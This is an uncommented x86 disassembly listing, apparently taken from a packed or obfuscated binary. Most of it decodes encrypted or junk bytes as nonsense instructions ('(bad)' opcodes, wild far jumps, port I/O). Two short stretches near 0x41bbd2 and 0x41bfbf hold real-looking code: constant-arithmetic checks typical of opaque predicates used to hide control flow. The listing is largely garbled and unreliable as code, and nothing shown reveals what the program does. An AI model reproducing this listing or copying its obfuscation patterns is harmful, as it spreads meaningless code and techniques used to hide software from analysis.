  41b96b:	jmp    0xbaf2f2d4
  41b970:	xor    ch,dl
  41b972:	or     ch,cl
  41b974:	sbb    al,0x1c
  41b976:	sbb    eax,0x28843b7c
  41b97b:	(bad)
  41b97e:	jb     0x41b912
  41b980:	adc    dl,BYTE PTR [ebp+0x6baa4af]
  41b986:	cmp    cl,BYTE PTR [edi-0x7b]
  41b989:	rcr    BYTE PTR [esi+ecx*1-0x4a],0x3c
  41b98e:	adc    DWORD PTR [ebx+edi*4+0x4a8e4db6],edx
  41b995:	pop    eax
  41b996:	bound  ebx,QWORD PTR [eax+0x2b]
  41b999:	mov    ebx,0x757e4676
  41b99e:	sar    DWORD PTR [esi],0xd1
  41b9a1:	mov    dl,0x27
  41b9a3:	xchg   ebp,ecx
  41b9a5:	mov    cl,0xd
  41b9a7:	(bad)  
  41b9a8:	(bad)  [eax]
  41b9aa:	mov    ah,0x23
  41b9ac:	sub    BYTE PTR [esi-0x49968eb1],cl
  41b9b2:	xor    eax,0x9e7283f5
  41b9b7:	pusha  
  41b9b8:	fnstenv [eax]
  41b9ba:	xor    edi,esi
  41b9bc:	xor    BYTE PTR gs:[ebx+0x34],dh
  41b9c0:	ss pop edi
  41b9c2:	cmp    eax,0x84eb3b69
  41b9c7:	fldenv [ebx]
  41b9c9:	push   0xffffff89
  41b9cb:	pop    ebp
  41b9cc:	mov    esp,0x809ba080
  41b9d1:	xor    BYTE PTR [eax+0x666c183c],cl
  41b9d7:	rcr    BYTE PTR [edx+ebp*1-0x3e5254c1],1
  41b9de:	fsub   DWORD PTR [esi+0x5a]
  41b9e1:	ins    BYTE PTR es:[edi],dx
  41b9e2:	iret   
  41b9e3:	in     al,0xfb
  41b9e5:	sbb    cl,BYTE PTR [ecx-0x36]
  41b9e8:	lods   al,BYTE PTR ds:[esi]
  41b9e9:	and    eax,0x8c60dc14
  41b9ee:	out    dx,eax
  41b9ef:	xlat   BYTE PTR ds:[ebx]
  41b9f0:	sbb    BYTE PTR [eax-0x6f2db80],ch
  41b9f6:	fcmovb st,st(2)
  41b9f8:	outs   dx,BYTE PTR ds:[esi]
  41b9f9:	out    dx,al
  41b9fa:	mov    eax,0x1042d8a1
  41b9ff:	test   DWORD PTR [ecx],eax
  41ba01:	push   edi
  41ba02:	in     al,0x1a
  41ba04:	loope  0x41b9c0
  41ba06:	and    BYTE PTR [edi+eax*1+0x69],al
  41ba0a:	xchg   ebx,eax
  41ba0b:	sbb    eax,0x54e62f58
  41ba10:	pop    esi
  41ba11:	cmp    bl,ch
  41ba13:	outs   dx,DWORD PTR ds:[esi]
  41ba14:	hlt    
  41ba15:	rcl    cl,0x31
  41ba18:	xchg   edx,eax
  41ba19:	xor    bh,dh
  41ba1b:	sar    DWORD PTR [eax-0xb21a832],cl
  41ba21:	sub    DWORD PTR [eax+0x88ab03b],esp
  41ba27:	push   edi
  41ba28:	nop
  41ba29:	or     esi,esi
  41ba2b:	push   edx
  41ba2c:	jg     0x41ba17
  41ba2e:	or     esp,DWORD PTR [esi+0x3b]
  41ba31:	lahf   
  41ba32:	(bad)  
  41ba33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba34:	sub    BYTE PTR [eax-0x359a98],bh
  41ba3a:	dec    ebx
  41ba3b:	push   esp
  41ba3c:	adc    dl,BYTE PTR [edi-0x3bad19ab]
  41ba42:	dec    eax
  41ba43:	ins    BYTE PTR es:[edi],dx
  41ba44:	cmc    
  41ba45:	cmp    DWORD PTR [ebx-0x30b46c28],edx
  41ba4b:	add    ecx,esp
  41ba4d:	or     eax,DWORD PTR [eax]
  41ba4f:	mov    dh,0x38
  41ba51:	aas    
  41ba52:	mov    eax,0x9e8c08ea
  41ba57:	gs and al,0x84
  41ba5a:	mov    edi,0x7339906b
  41ba5f:	push   0x7c
  41ba61:	aam    0x72
  41ba63:	aad    0xb4
  41ba65:	or     BYTE PTR [edx+ecx*2+0x11],al
  41ba69:	add    eax,0x80905d15
  41ba6e:	push   esp
  41ba6f:	rol    BYTE PTR [ecx],cl
  41ba71:	mov    al,ds:0x810d693c
  41ba76:	lods   al,BYTE PTR ds:[esi]
  41ba77:	xor    eax,0x3317243f
  41ba7c:	imul   ebx,DWORD PTR [ecx-0x58ca527d],0x6d
  41ba83:	xchg   esp,eax
  41ba84:	xchg   edi,eax
  41ba85:	ins    BYTE PTR es:[edi],dx
  41ba86:	repz dec esi
  41ba88:	mov    ebp,0xcfa2b4d5
  41ba8d:	push   es
  41ba8e:	xor    esi,ecx
  41ba90:	ins    DWORD PTR es:[edi],dx
  41ba91:	in     eax,0x50
  41ba93:	xchg   ecx,eax
  41ba94:	jmp    0x743b290f
  41ba99:	outs   dx,DWORD PTR ds:[esi]
  41ba9a:	ss add eax,0x5954930f
  41baa0:	or     edx,DWORD PTR [edx+edx*4+0x21b0785f]
  41baa7:	stos   DWORD PTR es:[edi],eax
  41baa8:	xor    eax,0x3199d176
  41baad:	cli    
  41baae:	aad    0x8f
  41bab0:	aaa    
  41bab1:	pop    edi
  41bab2:	pop    ebx
  41bab3:	loope  0x41ba8b
  41bab5:	mov    edx,0xc9389e1e
  41baba:	push   ecx
  41babb:	push   ebp
  41babc:	mov    edi,0xeaad47e3
  41bac1:	mov    esp,0x18f90284
  41bac6:	hlt    
  41bac7:	or     ecx,DWORD PTR [eax+0x7dff4eda]
  41bacd:	inc    ebx
  41bace:	into   
  41bacf:	hlt    
  41bad0:	(bad)  
  41bad1:	jp     0x41bb19
  41bad3:	in     eax,dx
  41bad4:	in     eax,dx
  41bad5:	imul   edi,DWORD PTR [edi],0x1c
  41bad8:	sahf   
  41bad9:	jl     0x41bb59
  41badb:	ret    0x44eb
  41bade:	out    0x43,eax
  41bae0:	out    dx,al
  41bae1:	adc    al,0x74
  41bae3:	xchg   ebx,eax
  41bae4:	mov    ebp,0xd97dd4bc
  41bae9:	sub    ecx,esi
  41baeb:	sub    edi,DWORD PTR [ecx-0x6e546acf]
  41baf1:	mov    eax,DWORD PTR [esi]
  41baf3:	ds xor bh,bh
  41baf6:	imul   edi,DWORD PTR [esi-0x3d04ec75],0x5
  41bafd:	mov    ah,0x6f
  41baff:	jg     0x41baa8
  41bb01:	jmp    0x9ddb4703
  41bb06:	push   ebx
  41bb07:	mov    eax,0x74f625f1
  41bb0c:	ror    BYTE PTR [edx],1
  41bb0e:	mov    ds:0x5548958b,eax
  41bb13:	nop
  41bb14:	jne    0x41bae1
  41bb16:	jl     0x41bab5
  41bb18:	lods   al,BYTE PTR ds:[esi]
  41bb19:	test   dh,0x4e
  41bb1c:	xlat   BYTE PTR ds:[ebx]
  41bb1d:	push   es
  41bb1e:	dec    edx
  41bb1f:	das    
  41bb20:	cmp    eax,0x70a6988a
  41bb25:	pop    ebx
  41bb26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb27:	popa   
  41bb28:	mov    ecx,0xff9ade0d
  41bb2d:	jge    0x41bae0
  41bb2f:	sbb    ebx,DWORD PTR [edi]
  41bb31:	outs   dx,BYTE PTR ds:[esi]
  41bb32:	push   ebx
  41bb33:	scas   eax,DWORD PTR es:[edi]
  41bb34:	in     al,dx
  41bb35:	inc    ebx
  41bb36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb37:	push   ebp
  41bb38:	sar    DWORD PTR [esi+0x0],1
  41bb3b:	push   edx
  41bb3c:	retf   0x580b
  41bb3f:	add    eax,0x32181fdc
  41bb44:	iret   
  41bb45:	push   esi
  41bb46:	sbb    eax,0xcdf553fd
  41bb4b:	sub    BYTE PTR [ecx],ah
  41bb4d:	test   BYTE PTR [edx],0xb
  41bb50:	push   0x31
  41bb52:	sbb    DWORD PTR [edi+0x63167c47],edi
  41bb58:	push   ebp
  41bb59:	or     eax,DWORD PTR [edx]
  41bb5b:	dec    eax
  41bb5c:	arpl   WORD PTR [edx+0x3e9ab2f0],sp
  41bb62:	push   esp
  41bb63:	stc    
  41bb64:	or     bl,BYTE PTR [ebx-0x26fac3bd]
  41bb6a:	cli    
  41bb6b:	jp     0x41bb89
  41bb6d:	cdq    
  41bb6e:	mov    dl,BYTE PTR [edx]
  41bb70:	push   0x488afe3e
  41bb75:	call   0xd9c12dd6
  41bb7a:	dec    ebp
  41bb7b:	jmp    0xa31:0x10724c3d
  41bb82:	sub    eax,0xd94fba4e
  41bb87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb88:	sub    al,0xeb
  41bb8a:	das    
  41bb8b:	jecxz  0x41bb3a
  41bb8d:	arpl   si,bx
  41bb8f:	and    al,0xa
  41bb91:	push   0x137412c4
  41bb96:	cmp    DWORD PTR [esi],ebx
  41bb98:	addr16 repnz mov dh,0x98
  41bb9c:	shl    BYTE PTR [edx+0x14b3643b],1
  41bba2:	(bad)  
  41bba3:	hlt    
  41bba4:	test   BYTE PTR [eax-0x73af6541],bl
  41bbaa:	mov    ds:0x8e2158aa,al
  41bbaf:	nop
  41bbb0:	fmul   QWORD PTR [edi+0x20]
  41bbb3:	rol    DWORD PTR [esi+0x45a7b459],cl
  41bbb9:	and    ah,0xa8
  41bbbc:	mov    BYTE PTR [edx+0x17cbb612],0x2b
  41bbc3:	test   BYTE PTR [edx+0x261df0b0],ch
  41bbc9:	push   edx
  41bbca:	push   ebx
  41bbcb:	mov    ebx,0x51b1bd86
  41bbd0:	int    0x69
  41bbd2:	and    cx,dx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	cmc    
  41bc02:	fcom   st(7)
  41bc04:	mov    esp,0x18168103
  41bc09:	mov    esp,0x50181812
  41bc0e:	loope  0x41bc29
  41bc10:	loope  0x41bc2a
  41bc12:	mov    fs,esi
  41bc14:	or     ch,dh
  41bc16:	add    dh,0x38
  41bc19:	cwde   
  41bc1a:	push   ebx
  41bc1b:	lods   eax,DWORD PTR ds:[esi]
  41bc1c:	xlat   BYTE PTR ds:[ebx]
  41bc1d:	pop    es
  41bc1e:	jne    0x41bc24
  41bc20:	in     al,dx
  41bc21:	cmc    
  41bc22:	jecxz  0x41bbf0
  41bc24:	dec    ebx
  41bc25:	mov    al,ds:0x504df8f0
  41bc2a:	shl    BYTE PTR [edx+eiz*1-0x660e2490],0x7
  41bc32:	cmp    dh,dl
  41bc34:	daa    
  41bc35:	push   edx
  41bc36:	(bad)  [edx+0x76]
  41bc39:	dec    ebp
  41bc3a:	fsubr  DWORD PTR [edi+0x4157781c]
  41bc40:	(bad)  
  41bc41:	dec    edi
  41bc42:	enter  0xa2cd,0xc8
  41bc46:	cmp    bh,BYTE PTR [ebx+0x28fa8490]
  41bc4c:	fwait
  41bc4d:	jmp    0x32c0550b
  41bc52:	popa   
  41bc53:	(bad)  
  41bc54:	xchg   ecx,eax
  41bc55:	pusha  
  41bc56:	lock stos DWORD PTR es:[edi],eax
  41bc58:	adc    BYTE PTR [ebx],ah
  41bc5a:	inc    ebp
  41bc5b:	les    esp,FWORD PTR [edx+0x17]
  41bc5e:	inc    ebp
  41bc5f:	or     BYTE PTR [ecx-0xe915cd9],bl
  41bc65:	push   ecx
  41bc66:	jo     0x41bbf0
  41bc68:	cdq    
  41bc69:	add    DWORD PTR [edi],0xf26eb166
  41bc6f:	sbb    edx,DWORD PTR [esi+0x3a7db65f]
  41bc75:	(bad)  
  41bc76:	popa   
  41bc77:	dec    eax
  41bc78:	cmp    ecx,ebx
  41bc7a:	pop    es
  41bc7b:	mov    al,BYTE PTR [edi-0x51c4995f]
  41bc81:	jecxz  0x41bc22
  41bc83:	add    ebx,esp
  41bc85:	adc    eax,0x50bd13de
  41bc8a:	pop    edx
  41bc8b:	fsub   st,st(5)
  41bc8d:	or     al,bl
  41bc8f:	jbe    0x41bcd6
  41bc91:	cmp    BYTE PTR [ebx-0x29db3cce],al
  41bc97:	or     eax,0x4a363737
  41bc9c:	out    0xb5,eax
  41bc9e:	mov    WORD PTR [ecx],?
  41bca0:	enter  0x62a2,0xe5
  41bca4:	add    bh,ch
  41bca6:	sahf   
  41bca7:	xor    BYTE PTR ds:0x3e729ce,ah
  41bcad:	inc    ecx
  41bcae:	mov    BYTE PTR [esi-0x2d2c158b],ch
  41bcb4:	hlt    
  41bcb5:	idiv   BYTE PTR [eax]
  41bcb7:	aam    0xe6
  41bcb9:	repnz rcr BYTE PTR [esi],cl
  41bcbc:	push   edi
  41bcbd:	mov    ds:0xf24b8955,al
  41bcc2:	rcl    DWORD PTR [ebx],1
  41bcc4:	das    
  41bcc5:	mov    edx,db6
  41bcc8:	test   BYTE PTR [edi],bl
  41bcca:	adc    al,BYTE PTR [esi-0x2b]
  41bccd:	cmp    eax,0x3d2d1f49
  41bcd2:	xlat   BYTE PTR ds:[ebx]
  41bcd3:	mov    ebp,0x21a6c2ee
  41bcd8:	sbb    al,0xbc
  41bcda:	jo     0x41bd20
  41bcdc:	adc    BYTE PTR [ebp-0x76a69cf6],ah
  41bce2:	cld    
  41bce3:	add    DWORD PTR [eax],eax
  41bce5:	inc    ebp
  41bce6:	into   
  41bce7:	push   esp
  41bce8:	pop    esi
  41bce9:	ja     0x41bc70
  41bceb:	aam    0x6a
  41bced:	out    0xa9,al
  41bcef:	push   es
  41bcf0:	pop    ds
  41bcf1:	cmp    DWORD PTR [ebx+eax*4+0x2877290],0xf067692f
  41bcfc:	xchg   edi,ebp
  41bcfe:	push   ebx
  41bcff:	inc    ebp
  41bd00:	pushf  
  41bd01:	mov    ds:0x923b27f7,eax
  41bd06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd07:	push   0x38
  41bd09:	aad    0xbb
  41bd0b:	dec    ebp
  41bd0c:	loope  0x41bd16
  41bd0e:	pop    edi
  41bd0f:	js     0x54ab6ab3
  41bd15:	shl    DWORD PTR [eax],0x2e
  41bd18:	dec    edi
  41bd19:	ja     0x41bd92
  41bd1b:	jb     0x41bd44
  41bd1d:	dec    edi
  41bd1e:	push   ebp
  41bd1f:	push   cs
  41bd20:	xor    ah,ah
  41bd22:	loope  0x41bce8
  41bd24:	cmp    al,0x5f
  41bd26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd27:	push   es
  41bd28:	cwde   
  41bd29:	jbe    0x41bd7c
  41bd2b:	pop    es
  41bd2c:	jae    0x41bd2a
  41bd2e:	cmp    DWORD PTR [esp+ebx*1-0x2e],edi
  41bd32:	clc    
  41bd33:	test   BYTE PTR [ecx+0x1d],0x3
  41bd37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd38:	cld    
  41bd39:	cmp    al,0x9b
  41bd3b:	adc    ecx,DWORD PTR [edi]
  41bd3d:	push   ebx
  41bd3e:	jno    0x41bcc1
  41bd40:	fwait
  41bd41:	and    bl,BYTE PTR [ebp+eiz*4+0x36786a35]
  41bd48:	mov    BYTE PTR [edx+0x2e],cl
  41bd4b:	popf   
  41bd4c:	mov    ds:0x868f47b0,al
  41bd51:	sub    ebx,DWORD PTR [ebp+0x52]
  41bd54:	es imul eax,ebx,0xf055db8d
  41bd5b:	sbb    DWORD PTR [ebx-0x387ad6c7],esi
  41bd61:	sub    DWORD PTR [ebp+0x51d5fb9d],esp
  41bd67:	mov    ebx,0x540d589d
  41bd6c:	or     DWORD PTR [ebp-0x61805b1c],0x5aa616c4
  41bd76:	mov    BYTE PTR [edx-0x59],0x16
  41bd7a:	out    dx,eax
  41bd7b:	dec    esp
  41bd7c:	aam    0x8c
  41bd7e:	pop    ebp
  41bd7f:	ret    0xc5e2
  41bd82:	sbb    dh,cl
  41bd84:	mov    ch,0xd
  41bd86:	je     0x41bdad
  41bd88:	cs mov dh,0x93
  41bd8b:	fsubr  st,st(5)
  41bd8d:	out    dx,eax
  41bd8e:	adc    BYTE PTR [edi-0x3b475d28],cl
  41bd94:	icebp  
  41bd95:	pop    ds
  41bd96:	pop    esp
  41bd97:	call   0x39897012
  41bd9c:	pop    ebx
  41bd9d:	pop    esp
  41bd9e:	std    
  41bd9f:	and    al,0xf2
  41bda1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bda2:	xor    eax,ecx
  41bda4:	push   edi
  41bda5:	repnz cmp al,0xe0
  41bda8:	pop    ebx
  41bda9:	dec    ebp
  41bdaa:	mov    al,0x95
  41bdac:	mov    ebx,0x798306cd
  41bdb1:	loope  0x41be11
  41bdb3:	push   ecx
  41bdb4:	aaa    
  41bdb5:	pop    eax
  41bdb6:	or     eax,0x9672379b
  41bdbb:	mov    ch,0x31
  41bdbd:	int3   
  41bdbe:	pop    edx
  41bdbf:	es retf 
  41bdc1:	ja     0x41bdac
  41bdc3:	nop
  41bdc4:	dec    esp
  41bdc5:	xchg   esi,eax
  41bdc6:	mov    bh,0x11
  41bdc8:	xchg   ecx,eax
  41bdc9:	jne    0x41be15
  41bdcb:	jge    0x41bd6e
  41bdcd:	add    bl,bh
  41bdcf:	jno    0x41bd97
  41bdd1:	arpl   WORD PTR [edx+0x6113a981],ax
  41bdd7:	push   ebx
  41bdd8:	pushf  
  41bdd9:	call   ebx
  41bddb:	in     eax,dx
  41bddc:	add    dl,BYTE PTR [ebx+0x23]
  41bddf:	jle    0x41bdb4
  41bde1:	mov    bh,0x79
  41bde3:	fld    DWORD PTR [eax+0x22]
  41bde6:	xchg   ebx,eax
  41bde7:	bswap  ebx
  41bde9:	inc    edx
  41bdea:	aas    
  41bdeb:	xchg   ebp,eax
  41bdec:	pop    es
  41bded:	outs   dx,BYTE PTR ds:[esi]
  41bdee:	push   ebx
  41bdef:	cwde   
  41bdf0:	pop    es
  41bdf1:	mov    al,ds:0xbf1d7c7
  41bdf6:	mov    eax,ds:0x38b56d81
  41bdfb:	lods   eax,DWORD PTR ss:[esi]
  41bdfd:	stos   DWORD PTR es:[edi],eax
  41bdfe:	adc    edx,ecx
  41be00:	out    0x9a,al
  41be02:	inc    edx
  41be03:	enter  0x1bf8,0x71
  41be07:	xchg   dh,bh
  41be09:	retf   0x31ba
  41be0c:	adc    al,0xcb
  41be0e:	adc    eax,0xd938b4c6
  41be13:	mul    BYTE PTR [edx+0x5e]
  41be16:	sub    dl,cl
  41be18:	stos   BYTE PTR es:[edi],al
  41be19:	pop    ecx
  41be1a:	ret    0x3b50
  41be1d:	add    DWORD PTR ds:0xb09fc2ed,ecx
  41be23:	addr16 jmp 0x951faae5
  41be29:	aad    0xe5
  41be2b:	cli    
  41be2c:	mov    eax,ds:0x36fc380f
  41be31:	inc    edx
  41be32:	pop    ebx
  41be33:	sub    edx,ebp
  41be35:	mov    dl,0x1
  41be37:	cmp    eax,0xb698776c
  41be3c:	leave  
  41be3d:	int    0xaa
  41be3f:	mov    bh,0x92
  41be41:	jne    0x41bde2
  41be43:	sbb    al,0xd4
  41be45:	inc    edx
  41be46:	jmp    0x9762:0x3e43bba5
  41be4d:	inc    ebp
  41be4e:	pop    ebp
  41be4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be50:	ret    
  41be51:	inc    esi
  41be52:	jp     0x41beb8
  41be54:	sbb    dh,BYTE PTR [esi+0x7fa877e]
  41be5a:	cs dec esp
  41be5c:	out    0x10,eax
  41be5e:	push   esp
  41be5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be60:	adc    al,0x9f
  41be62:	jmp    0xb724a28f
  41be67:	aad    0x73
  41be69:	dec    ebp
  41be6a:	pop    esp
  41be6b:	nop
  41be6c:	adc    edx,DWORD PTR [edi+0x62]
  41be6f:	adc    edx,eax
  41be71:	fidivr DWORD PTR [esi-0x8]
  41be74:	scas   eax,DWORD PTR es:[edi]
  41be75:	pop    ebp
  41be76:	and    al,BYTE PTR [eax+edi*2]
  41be79:	mov    ch,0xbc
  41be7b:	mov    ah,0xd0
  41be7d:	loopne 0x41be93
  41be7f:	lds    esi,FWORD PTR [edx+0x23448059]
  41be85:	mov    ds:0x9592bcd1,eax
  41be8a:	jae    0x41bef9
  41be8c:	inc    edi
  41be8d:	jnp    0x41bea8
  41be8f:	leave  
  41be90:	imul   ebx,DWORD PTR [edi],0xffffffdf
  41be93:	scas   eax,DWORD PTR es:[edi]
  41be94:	test   al,0xe8
  41be96:	out    0xaf,al
  41be98:	sub    edi,DWORD PTR [ebx-0x79d8765d]
  41be9e:	ss int3 
  41bea0:	(bad)  
  41bea1:	xchg   ecx,eax
  41bea2:	test   al,0x1a
  41bea4:	push   0x7
  41bea6:	xchg   ebp,eax
  41bea7:	mov    esp,0x893052ce
  41beac:	sub    eax,0xcbe20c48
  41beb1:	sti    
  41beb2:	adc    eax,0x20b3e7b5
  41beb7:	in     eax,dx
  41beb8:	sub    esp,DWORD PTR gs:[eax+0x1ab185d2]
  41bebf:	icebp  
  41bec0:	mov    al,ds:0x93ca1db0
  41bec5:	retf   0x6f04
  41bec8:	fwait
  41bec9:	jp     0x41bed3
  41becb:	in     al,0xe0
  41becd:	xchg   esp,eax
  41bece:	lods   al,BYTE PTR ds:[esi]
  41becf:	call   0xb70f1657
  41bed4:	and    al,dh
  41bed6:	mov    al,BYTE PTR [eax-0x7b]
  41bed9:	(bad)
  41bedc:	aas    
  41bedd:	mov    eax,0xb72760f2
  41bee2:	push   ebp
  41bee3:	add    esi,DWORD PTR [eax+0xc0a6f9e]
  41bee9:	outs   dx,DWORD PTR ds:[esi]
  41beea:	aad    0x40
  41beec:	dec    eax
  41beed:	cmp    edx,DWORD PTR [eax+0x56]
  41bef0:	imul   edi,DWORD PTR [ebx+ebp*4+0x7b1d52ca],0xb6916cc2
  41befb:	or     DWORD PTR [ebp-0x5d],edx
  41befe:	fs icebp 
  41bf00:	ins    DWORD PTR es:[edi],dx
  41bf01:	xor    bl,BYTE PTR [edi+0x18]
  41bf04:	sbb    bl,BYTE PTR [edx-0x6a125dc4]
  41bf0a:	mov    ds:0xa21acbe1,al
  41bf0f:	pop    edi
  41bf10:	sbb    eax,0xf1b0612a
  41bf15:	popa   
  41bf16:	mov    ah,0x91
  41bf18:	lds    edi,FWORD PTR [esi+0xe643318]
  41bf1e:	icebp  
  41bf1f:	mov    esp,0xa6ce282
  41bf24:	pop    edi
  41bf25:	imul   ebx,DWORD PTR [ebp+0x7d],0x7e
  41bf29:	imul   DWORD PTR [edx]
  41bf2b:	adc    eax,0x60656176
  41bf30:	pop    es
  41bf31:	fisub  WORD PTR [ebp-0x5508b70d]
  41bf37:	mov    eax,ds:0x47c2f8f3
  41bf3c:	adc    al,0x19
  41bf3f:	jmp    0x2d87f977
  41bf44:	push   ebx
  41bf45:	mov    esp,0x8de301d7
  41bf4a:	xchg   esi,eax
  41bf4b:	mov    ah,BYTE PTR [esi]
  41bf4d:	pop    esp
  41bf4e:	fisub  DWORD PTR [edx+eax*4-0x27]
  41bf52:	inc    esi
  41bf53:	jb     0x41bf09
  41bf55:	out    dx,al
  41bf56:	push   edi
  41bf57:	mov    eax,ds:0x1510f4e7
  41bf5c:	fadd   st,st(0)
  41bf5e:	std    
  41bf5f:	out    dx,al
  41bf60:	sub    al,BYTE PTR [eax+0xaa8e350]
  41bf66:	cwde   
  41bf67:	es sahf 
  41bf69:	and    dl,ch
  41bf6b:	repz jp 0x41bf33
  41bf6e:	or     eax,0x949ad6fc
  41bf73:	call   0xc2000a73
  41bf78:	or     eax,0xcf443510
  41bf7d:	add    BYTE PTR [ebx-0x58e89313],ah
  41bf83:	call   0xeeb:0x5521f3a2
  41bf8a:	sub    eax,0xedfe9cf4
  41bf8f:	test   BYTE PTR [ebp+eax*2-0x5e],ch
  41bf93:	xor    esi,esi
  41bf95:	out    dx,al
  41bf96:	jo     0x41bf58
  41bf98:	in     al,dx
  41bf99:	pop    ds
  41bf9a:	mov    dl,0x8c
  41bf9c:	mov    ds:0xedb63b3e,al
  41bfa1:	ja     0x41bf8b
  41bfa3:	mov    eax,0xe078d5f6
  41bfa8:	push   0xa1d1918
  41bfad:	mov    ebp,0x4fb0ca43
  41bfb2:	or     BYTE PTR [eax+edi*1+0x1e],ah
  41bfb6:	mov    ch,0x56
  41bfb8:	inc    eax
  41bfb9:	sahf   
  41bfba:	inc    ebx
  41bfbb:	xchg   esp,ecx
  41bfbd:	fsubr  QWORD PTR [ecx]
  41bfbf:	mov    ecx,0x57d4
  41bfc4:	mov    WORD PTR [esp+0x2c],cx
  41bfc9:	mov    ecx,0x3b21
  41bfce:	mov    WORD PTR [esp+0x38],cx
  41bfd3:	mov    ecx,0x52fd
  41bfd8:	mov    WORD PTR [esp+0x24],cx
  41bfdd:	mov    ecx,0x2ce0
  41bfe2:	mov    WORD PTR [esp+0xc],cx
  41bfe7:	mov    cx,WORD PTR [esp+0xc]
  41bfec:	mov    dx,WORD PTR [esp+0x24]
  41bff1:	or     cx,dx
  41bff4:	mov    edx,0x21a4
  41bff9:	or     cx,dx
  41bffc:	mov    dx,WORD PTR [esp+0x2c]
  41c001:	sub    cx,dx
  41c004:	mov    dx,WORD PTR [esp+0x38]
  41c009:	sub    cx,dx
  41c00c:	mov    dx,WORD PTR [esp+0x3c]
  41c011:	cmp    dx,cx
  41c014:	jbe    0x41c888
  41c01a:	mov    ecx,0x5008
  41c01f:	mov    WORD PTR [esp+0x24],cx
  41c024:	mov    ecx,0x60ce
  41c029:	mov    WORD PTR [esp+0xc],cx
  41c02e:	movzx  ecx,WORD PTR [esp+0xc]
  41c033:	mov    edx,0x2095
  41c038:	or     cx,dx
  41c03b:	mov    dx,WORD PTR [esp+0x24]
  41c040:	sub    cx,dx
  41c043:	mov    edx,0x10de
  41c048:	or     ecx,0x742f
  41c04e:	imul   ecx,ecx,0x30b2
  41c054:	mov    WORD PTR [esp+0x3c],cx
  41c059:	mov    ecx,0x6143
  41c05e:	mov    WORD PTR [esp+0x38],cx
  41c063:	mov    ecx,0x679f
  41c068:	mov    WORD PTR [esp+0x2c],cx
  41c06d:	mov    ecx,0x1210
  41c072:	mov    WORD PTR [esp+0x24],cx
  41c077:	mov    ecx,0x3308
  41c07c:	mov    WORD PTR [esp+0xc],cx
  41c081:	mov    cx,WORD PTR [esp+0xc]
  41c086:	sub    cx,dx
  41c089:	mov    dx,WORD PTR [esp+0x24]
  41c08e:	xor    cx,dx
  41c091:	mov    dx,WORD PTR [esp+0x2c]
  41c096:	imul   cx,dx
  41c09a:	mov    dx,WORD PTR [esp+0x38]
  41c09f:	and    cx,dx
  41c0a2:	mov    edx,0x694c
  41c0a7:	and    cx,dx
  41c0aa:	mov    dx,WORD PTR [esp+0x3c]
  41c0af:	cmp    dx,cx
  41c0b2:	ja     0x41c888
  41c0b8:	mov    ecx,DWORD PTR [esp+0x18]
  41c0bc:	mov    edx,DWORD PTR [esp+0x1c]
  41c0c0:	shrd   ecx,edx,0x2
  41c0c4:	xor    ecx,eax
  41c0c6:	mov    eax,DWORD PTR [esp+0x18]
  41c0ca:	shr    edx,0x2
  41c0cd:	mov    edx,DWORD PTR [esp+0x1c]
  41c0d1:	xor    edx,edx
  41c0d3:	or     edx,ecx
  41c0d5:	push   edx
  41c0d6:	push   esi
  41c0d7:	shl    eax,0x1e
  41c0da:	push   edi
  41c0db:	lea    eax,[esp+0x7c]
  41c0df:	push   eax
  41c0e0:	lea    eax,[esp+0x28]
  41c0e4:	push   eax
  41c0e5:	jmp    0x41c4b4
  41c0ea:	in     eax,0x66
  41c0ec:	sar    BYTE PTR [ebx],1
  41c0ee:	dec    edx
  41c0ef:	sbb    esp,DWORD PTR [edx+0x1e]
  41c0f2:	icebp  
  41c0f3:	scas   eax,DWORD PTR es:[edi]
  41c0f4:	mov    ch,0x7c
  41c0f6:	push   esp
  41c0f7:	xor    DWORD PTR [edi-0x44],esp
  41c0fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0fb:	jns    0x41c113
  41c0fd:	sbb    BYTE PTR [edx+edx*1+0x7fd11818],bh
  41c104:	push   ebx
  41c105:	fbstp  TBYTE PTR [edi-0x75]
  41c108:	adc    DWORD PTR [ebx+0x13],esi
  41c10b:	leave  
  41c10c:	dec    esp
  41c10d:	xor    DWORD PTR [ecx],esp
  41c10f:	pop    eax
  41c110:	test   DWORD PTR [eax+ecx*2+0x59],esp
  41c114:	ficomp DWORD PTR [ebx]
  41c116:	sbb    dh,BYTE PTR [esi+0x23]
  41c119:	sbb    edi,ebp
  41c11b:	push   edi
  41c11c:	mov    al,ds:0xe91b667c
  41c121:	xor    BYTE PTR [edx+ebp*1-0xc5717a4],0x48
  41c129:	mov    ecx,DWORD PTR [ecx]
  41c12b:	push   eax
  41c12c:	outs   dx,BYTE PTR ds:[esi]
  41c12d:	push   0x7a
  41c12f:	es sbb al,0x8b
  41c132:	(bad)  
  41c133:	fidivr WORD PTR [edi-0x22]
  41c136:	sbb    al,0xbd
  41c138:	(bad)  
  41c139:	pushf  
  41c13a:	rol    BYTE PTR [edx+0x54b711b3],1
  41c140:	mov    al,ds:0xb47656f6
  41c145:	jle    0x41c162
  41c147:	popf   
  41c148:	out    0xf2,eax
  41c14a:	ror    bl,cl
  41c14c:	xor    eax,DWORD PTR [esi+ebx*1-0x7840efbd]
  41c153:	cld    
  41c154:	cmp    dl,BYTE PTR [edi]
  41c156:	dec    edi
  41c157:	fst    DWORD PTR [edi-0x1e025cea]
  41c15d:	jns    0x41c14a
  41c15f:	push   esi
